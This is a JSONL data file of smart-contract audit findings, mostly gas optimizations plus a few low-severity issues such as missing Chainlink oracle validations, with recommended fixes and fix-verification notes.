{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-011", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 11, "page_start": null, "title": "Use `ReentrancyGuardTransient` instead of `ReentrancyGuard` or more gas-efficient `nonReentrant` modifiers", "short_summary": null, "description_md": null, "full_markdown": "### Use `ReentrancyGuardTransient` instead of `ReentrancyGuard` or more gas-efficient `nonReentrant` modifiers\n\n**Description:** Use [`ReentrancyGuardTransient`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuardTransient.sol) instead of `ReentrancyGuard` for more gas-efficient `nonReentrant` modifiers. The OpenZeppelin version would need to be bumped to 5.1.\n\n**Rocko:** Fixed in commit [675f4b2](https://github.com/getrocko/onchain/commit/675f4b2e59cddf6c3f9f2e866f4401564bd0a006).\n\n**Cyfrin:** Verified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-012", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 12, "page_start": null, "title": "Remove obsolete check in `updateFee`", "short_summary": null, "description_md": null, "full_markdown": "### Remove obsolete check in `updateFee`\n\n**Description:** Remove obsolete check in `updateFee`:\n```diff\n-        require(newFee >= 0, \"Fee must not be negative\");\n```\n\nThis check is obsolete since `newFee` is declared as `uint256` therefore cannot be negative.\n\n**Rocko:** Fixed in commit [2c50838](https://github.com/getrocko/onchain/commit/2c50838a5cc5e498a14874a5d3348da20087e6bc).\n\n**Cyfrin:** Verified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-013", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 13, "page_start": null, "title": "Use `msg.sender` instead of `owner()` inside `onlyOwner` functions", "short_summary": null, "description_md": null, "full_markdown": "### Use `msg.sender` instead of `owner()` inside `onlyOwner` functions\n\n**Description:** Using `msg.sender` instead of `owner()` inside `onlyOwner` functions is more efficient as it eliminates reading from storage. It is also safe since the `onlyOwner` modifier ensures that `msg.sender` is the owner:\n```solidity\n757:        IERC20(tokenAddress).safeTransfer(owner(), amount);\n766:        (bool success, ) = owner().call{ value: amount }(\"\");\n```\n\n**Rocko:** Fixed in commit [751e906](https://github.com/getrocko/onchain/commit/751e906b7c2df6cb587e709b12de25593eb02c75).\n\n**Cyfrin:** Verified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-014", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 14, "page_start": null, "title": "Prevent repetitive hashing of identical strings", "short_summary": null, "description_md": null, "full_markdown": "### Prevent repetitive hashing of identical strings\n\n**Description:** `RockoFlashRefinance::_compareStrings` is often called with the same values resulting in duplicate unnecessary work. A simple and more efficient way to prevent this is by first performing the conversion using `_parseProtocol` for both `from`/`to` inputs then simply comparing the enums as needed in functions like `refinance` and `_revokeTokenSpendApprovals`.\n\nIf string comparisons are required:\n* hard-code the hash result as `bytes32` constants for common expected strings such as \"aave\", \"morpho\", \"compound\" and using these hard-coded constants inside `_parseProtocol` and other functions\n* in functions such as `RockoFlashRefinance::refinance`, cache the hash of the `from`/`to` inputs in local `bytes32` variables and use the cached hashes and the hard-coded constants for the comparisons\n\nOne simple way to achieve this is by:\n* defining a function to return the hash of a string:\n```solidity\n    function _hashString(string calldata input) private pure returns (bytes32 output) {\n        output = keccak256(bytes(input));\n    }\n```\n* changing `_compareStrings` to take two `bytes32` as input:\n```solidity\n    function _compareStrings(bytes32 a, bytes32 b) private pure returns (bool) {\n        return a == b;\n    }\n```\n\nConsider OpenZeppelin's string equality [implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Strings.sol#L134-L136) as well.\n\n**Rocko:** Fixed in commit [a59ba0e](https://github.com/getrocko/onchain/commit/a59ba0e7958c544ad95788ce29923a342a2ea35a).\n\n**Cyfrin:** Verified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-015", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 15, "page_start": null, "title": "Don't initialize to default values", "short_summary": null, "description_md": null, "full_markdown": "### Don't initialize to default values\n\n**Description:** Don't initialize to default values as Solidity already does this:\n```solidity\n78:        ROCKO_FEE_BP = 0;\n597:        uint256 debtBalance = 0;\n598:        uint256 morphoDebtShares = 0;\n```\n\n**Rocko:** Fixed in commit [751e906](https://github.com/getrocko/onchain/commit/751e906b7c2df6cb587e709b12de25593eb02c75).\n\n**Cyfrin:** Verified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-016", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 16, "page_start": null, "title": "Use named return variables to eliminate redundant local variables and `return` statements", "short_summary": null, "description_md": null, "full_markdown": "### Use named return variables to eliminate redundant local variables and `return` statements\n\n**Description:** Use named return variables to eliminate redundant local variables and `return` statements:\n```diff\n// _closeLoanPositionAndReturnCollateralBalance L457\n-    ) private returns (uint256) {\n+    ) private returns (uint256 collateralBalance) {\n\n// L464\n-        uint256 collateralBalance;\n\n// L480\n-        return collateralBalance;\n```\n\nSame idea can be applied to `_collateralBalanceOfAave`, `_getDebtBalanceOfAave`.\n\n**Rocko:** Fixed in commit [751e906](https://github.com/getrocko/onchain/commit/751e906b7c2df6cb587e709b12de25593eb02c75).\n\n**Cyfrin:** Verified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-017", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 17, "page_start": null, "title": "Remove redundant `onBehalfOf` variables", "short_summary": null, "description_md": null, "full_markdown": "### Remove redundant `onBehalfOf` variables\n\n**Description:** Remove redundant `onBehalfOf` variables:\n```diff\n    function _supplyToAave(address collateralAddress, uint256 collateralBalance, address rockoWallet) private {\n-       address onBehalfOf = rockoWallet;\n-       AAVE.supply(collateralAddress, collateralBalance, onBehalfOf, AAVE_REFERRAL_CODE);\n+       AAVE.supply(collateralAddress, collateralBalance, rockoWallet, AAVE_REFERRAL_CODE);\n    }\n    function _borrowFromAave(address rockoWallet, address token, uint256 borrowAmount) private {\n-       address onBehalfOf = rockoWallet;\n-       AAVE.borrow(token, borrowAmount, AAVE_INTERESTE_RATE_MODE, AAVE_REFERRAL_CODE, onBehalfOf);\n+       AAVE.borrow(token, borrowAmount, AAVE_INTERESTE_RATE_MODE, AAVE_REFERRAL_CODE, rockoWallet);\n    }\n```\n\n**Rocko:** Fixed in commit [751e906](https://github.com/getrocko/onchain/commit/751e906b7c2df6cb587e709b12de25593eb02c75).\n\n**Cyfrin:** Verified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-018", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 18, "page_start": null, "title": "Remove redundant `morphoMarketId` validation checks in `_closeLoanMorphoWithShares` and `_openLoanPosition`", "short_summary": null, "description_md": null, "full_markdown": "### Remove redundant `morphoMarketId` validation checks in `_closeLoanMorphoWithShares` and `_openLoanPosition`\n\n**Description:** `RockoFlashRefinance::_closeLoanMorphoWithShares` and `_openLoanPosition` contain redundant validation `morphoMarketId`. The reasons why this validation is redundant:\n\n* `RockoFlashRefinance::refinance` already validates the input `morphoMarketId`, encodes it into the `data` payload then calls `Morpho::flashLoan` with the `data` payload:\n```solidity\nif (_compareStrings(to, \"morpho\") || _compareStrings(from, \"morpho\")) {\n    require(_isValidId(morphoMarketId), \"Morpho Market ID required for Morpho refinance\");\n}\n\nbytes memory data = abi.encode(\n    rockoWallet,\n    from,\n    to,\n    debtTokenAddress,\n    collateralTokenAddress,\n    aCollateralTokenAddress,\n    morphoMarketId,\n    morphoDebtShares\n);\n\nMORPHO.flashLoan(debtTokenAddress, debtBalance, data);\n```\n\n* `Morpho::flashLoan` always passes the unmodified `data` payload to `RockoFlashRefinance::onMorphoFlashLoan`:\n```solidity\nfunction flashLoan(address token, uint256 assets, bytes calldata data) external {\n    require(assets != 0, ErrorsLib.ZERO_ASSETS);\n\n    emit EventsLib.FlashLoan(msg.sender, token, assets);\n\n    IERC20(token).safeTransfer(msg.sender, assets);\n\n    // @audit passing unmodified `data` payload to `onMorphoFlashLoan`\n    IMorphoFlashLoanCallback(msg.sender).onMorphoFlashLoan(assets, data);\n\n    IERC20(token).safeTransferFrom(msg.sender, address(this), assets);\n}\n```\n\n*`RockoFlashRefinance::onMorphoFlashLoan` decodes the unmodified `data` payload and calls `_closeLoanMorphoWithShares` and `_openLoanPosition` using the decoded `morphoMarketId` which has already been validated in `RockoFlashRefinance::refinance`.\n\n**Recommended Mitigation:** Remove the redundant `morphoMarketId` validation checks at:\n```solidity\n325: require(_isValidId(morphoMarketId), \"Invalid Morpho Market ID\");\n\n503: require(_isValidId(morphoMarketId), \"Morpho Market ID required for Morpho refinance\");\n```\n\n**Rocko:** Fixed in commit [5a9aa7d](https://github.com/getrocko/onchain/commit/5a9aa7d3cfb80150448608854440c285ea08fa53).\n\n**Cyfrin:** Verified.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0-019", "doc_id": "cyfrin_2025-03-28-cyfrin-rocko-refinance-v2.0", "finding_index": 19, "page_start": null, "title": "Redundant collateral balance check in `_openLoanMorpho`", "short_summary": null, "description_md": null, "full_markdown": "### Redundant collateral balance check in `_openLoanMorpho`\n\n**Description:** `RockoFlashRefinance::_openLoanMorpho` contains a redundant check for collateral balance availability. The function verifies that the flash loan contract has sufficient collateral balance, but this check is already performed in the calling `_openLoanPosition` function.\n\n**Recommended Mitigation:**\n```diff\n    function _openLoanMorpho(\n        Id morphoMarketId,\n        uint256 borrowAmount,\n        address collateralAddress,\n        uint256 collateralBalance,\n        address rockoWallet\n    ) private {\n        _checkAllowanceAndApproveContract(address(MORPHO), collateralAddress, collateralBalance);\n        MarketParams memory marketParams = MORPHO.idToMarketParams(morphoMarketId);\n-       uint256 flashLoanContractBalance = IERC20(collateralAddress).balanceOf(FLASH_LOAN_CONTRACT);\n-       // emit LogBalance(\"Flash Loan Contract Balance\", flashLoanContractBalance);\n-       require(\n-           flashLoanContractBalance >= collateralBalance,\n-           \"Insufficient collateral available in the flash contract\"\n-       );\n```\n\n**Rocko:** Fixed in commit [a8efb43](https://github.com/getrocko/onchain/commit/a8efb43b10673508e1fd184aec23a5373f73cd5d).\n\n**Cyfrin:** Verified.\n\n\\clearpage\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "fda6b85f2c65d146b86d513a604554d15abd6679", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-03-28-cyfrin-rocko-refinance-v2.0.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.921544+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.922340+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-001", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 1, "page_start": null, "title": "Missing common Chainlink Oracle validations", "short_summary": null, "description_md": null, "full_markdown": "### Missing common Chainlink Oracle validations\n\n**Description:** The protocol is missing common [Chainlink Oracle validations](https://medium.com/contractlevel/chainlink-oracle-defi-attacks-93b6cb6541bf); it calls `AggregatorV3Interface::latestRoundData` without any validation of the result:\n```solidity\nfunction _getLatestPrice() internal view returns (uint256) {\n    //slither-disable-next-line unused-return\n    (, int256 price,,,) = i_nativeUsdFeed.latestRoundData();\n    return uint256(price);\n}\n```\n\n**Recommended Mitigation:** Implement common Chainlink oracle validations such as checking for:\n* [stale prices](https://medium.com/contractlevel/chainlink-oracle-defi-attacks-93b6cb6541bf#99af) using the [correct heartbeat](https://medium.com/contractlevel/chainlink-oracle-defi-attacks-93b6cb6541bf#fb78) for the particular oracle\n* [down L2 sequencer](https://medium.com/contractlevel/chainlink-oracle-defi-attacks-93b6cb6541bf#0faf), [revert if `startedAt == 0`](https://solodit.contractlevel.io/issues/insufficient-checks-to-confirm-the-correct-status-of-the-sequenceruptimefeed-codehawks-zaros-git) and potentially a small [grace period](https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code) of ~2 minutes after it recovers before resuming to fetch price data\n* [returned price not at min or max boundaries](https://medium.com/contractlevel/chainlink-oracle-defi-attacks-93b6cb6541bf#00ac)\n\nFor this protocol the impact of omitting these checks is quite minimal; in a worst-case scenario users are able to buy NFTs for a cheaper or greater price, but there is no threat to protocol solvency/user liquidation etc as can be a threat in other protocols. And since users can only buy 1 NFT and can't sell/transfer, it isn't that big a deal. If these checks are excluded to keep gas costs down perhaps just put a comment noting this.\n\n**Evo:**\nFixed in commits [6af531e](https://github.com/contractlevel/sbt/commit/6af531e49f7d7dd525da449bcdbdacb171e0c70d),[7a06688](https://github.com/contractlevel/sbt/commit/7a0668860f9b4f43798988349a966147bf94f33f), [93021e4](https://github.com/contractlevel/sbt/commit/93021e4f9c2afb40f64f9f9de69661a134702313).\n\n**Cyfrin:** Verified.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-002", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 2, "page_start": null, "title": "Users who are removed from the blacklist have to pay again for their NFT", "short_summary": null, "description_md": null, "full_markdown": "### Users who are removed from the blacklist have to pay again for their NFT\n\n**Description:** When a user is added to the blacklist, the NFT which they already paid for is burned:\n```solidity\nfunction _addToBlacklist(address account) internal {\n    // *snip: code not relevant *//\n\n    if (balanceOf(account) > 0) {\n        uint256 tokenId = tokenOfOwnerByIndex(account, 0); // Get first token\n        _burn(tokenId); // Burn the token\n    }\n}\n```\n\nBut when they are removed from the blacklist, they do not receive a free NFT to make up for their previously burned one, nor is there any flag set that would enable them to mind their NFT again but without paying a fee:\n```solidity\nfunction _removeFromBlacklist(address account) internal {\n    if (!s_blacklist[account]) revert SoulBoundToken__NotBlacklisted(account);\n\n    s_blacklist[account] = false;\n    emit RemovedFromBlacklist(account);\n}\n```\n\n**Impact:** A user who bought an NFT, then was blacklisted, then removed from the blacklist will have to pay twice to get the NFT.\n\n**Recommended Mitigation:** This doesn't seem fair; if a user had an NFT burned when they were blacklisted, they should receive a free NFT back if later removed from the blacklist.\n\n**Evo:**\nAcknowledged; in the unlikely case a user is blacklisted due to admin error then subsequently removed from the blacklist, the DAO will compensate the user via a community vote.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0-003", "doc_id": "cyfrin_2025-06-02-cyfrin-evo-soulboundtoken-v2.0", "finding_index": 3, "page_start": null, "title": "Round up fee against users", "short_summary": null, "description_md": null, "full_markdown": "### Round up fee against users\n\n**Description:** Solidity by default rounds down, but generally fees should be rounded up against users. Using Solady's [library](https://github.com/Vectorized/solady/blob/main/src/utils/FixedPointMathLib.sol) is significantly more efficient than OpenZeppelin:\n```solidity\nimport {FixedPointMathLib} from \"@solady/utils/FixedPointMathLib.sol\";\n\nfunction _getFee() internal view returns (uint256 fee) {\n    // read fee factor directly to output variable\n    fee = s_feeFactor;\n\n    // only do extra work if non-zero\n    if(fee != 0) fee = FixedPointMathLib.fullMulDivUp(fee, PRICE_FEED_PRECISION, _getLatestPrice());\n}\n```\n\nA secondary benefit of using the above is eliminating the possibility of revert due to [intermediate multiplication overflow](https://x.com/DevDacian/status/1892529633104396479), though in this code it isn't a real possibility.\n\nIf you don't want to round up against users but want a slightly faster implementation than the default:\n```solidity\nfunction _getFee() internal view returns (uint256 fee) {\n    // read fee factor directly to output variable\n    fee = s_feeFactor;\n\n    // only do extra work if non-zero\n    if(fee != 0) fee = (fee * PRICE_FEED_PRECISION) / _getLatestPrice();\n}\n```\n\n**Evo:**\nFixed in commit [52c5384](https://github.com/contractlevel/sbt/commit/52c538448fbceb09f27ae657bcecb0c1483eb933).\n\n**Cyfrin:** Verified.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/contractlevel/sbt", "org": "contractlevel", "name": "sbt", "commit": "6af531e49f7d7dd525da449bcdbdacb171e0c70d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md", "source_mtime": "2025-11-01T12:05:00+00:00", "report_extracted_at": "2025-11-12T02:04:23.924809+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.925476+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
